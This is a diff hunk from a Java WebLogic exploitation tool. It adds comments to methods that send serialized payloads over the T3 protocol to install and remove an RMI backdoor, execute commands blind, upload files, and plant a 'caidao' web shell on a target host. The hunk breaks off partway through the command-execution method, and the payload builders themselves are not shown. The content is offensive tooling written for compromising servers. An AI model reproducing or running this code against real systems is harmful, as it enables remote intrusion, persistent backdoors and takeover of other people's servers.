@@ -7,35 +7,80 @@ package com.supeream.weblogic;
 
 import com.supeream.Main;
 import com.supeream.serial.SerialDataGenerator;
-import com.supeream.serial.Serializables;
 
 public class WebLogicOperation {
 
+    /**
+     * install a backdoor rmi
+     *
+     * @param host
+     * @param port
+     * @throws Exception
+     */
     public static void installRmi(String host, String port) throws Exception {
         byte[] payload = SerialDataGenerator.serialRmiDatas(new String[]{"install"});
         T3ProtocolOperation.send(host, port, payload);
     }
 
+    /**
+     * remove the rmi backdoor
+     *
+     * @param host
+     * @param port
+     * @throws Exception
+     */
     public static void unInstallRmi(String host, String port) throws Exception {
         byte[] payload = SerialDataGenerator.serialRmiDatas(new String[]{"uninstall"});
         T3ProtocolOperation.send(host, port, payload);
     }
 
+    /**
+     * @param host
+     * @param port
+     * @throws Exception
+     * @deprecated blind execute command
+     */
     public static void blind(String host, String port) throws Exception {
         byte[] payload = SerialDataGenerator.serialRmiDatas(new String[]{"blind", Main.cmdLine.getOptionValue("C")});
         T3ProtocolOperation.send(host, port, payload);
     }
 
+    /**
+     * upload a file
+     *
+     * @param host
+     * @param port
+     * @param filePath
+     * @param content
+     * @throws Exception
+     */
     public static void uploadFile(String host, String port, String filePath, byte[] content) throws Exception {
         byte[] payload = SerialDataGenerator.serialUploadDatas(filePath, content);
         T3ProtocolOperation.send(host, port, payload);
     }
 
+    /**
+     * upload a default caidao backdoor
+     *
+     * @param host
+     * @param port
+     * @param fileName
+     * @throws Exception
+     */
     public static void uploadFileShell(String host, String port, String fileName) throws Exception {
         byte[] payload = SerialDataGenerator.serialUploadShellDatas(fileName);
         T3ProtocolOperation.send(host, port, payload);
     }
 
+    /**
+     * blind execute command
+     * replace bind
+     *
+     * @param host
+     * @param port
+     * @param cmd
+     * @throws Exception
+     */
     public static void blindExecute(String host, String port, String cmd) throws Exception {
         String[] cmds = new String[]{cmd};
         if (Main.cmdLine.hasOption("os")) {
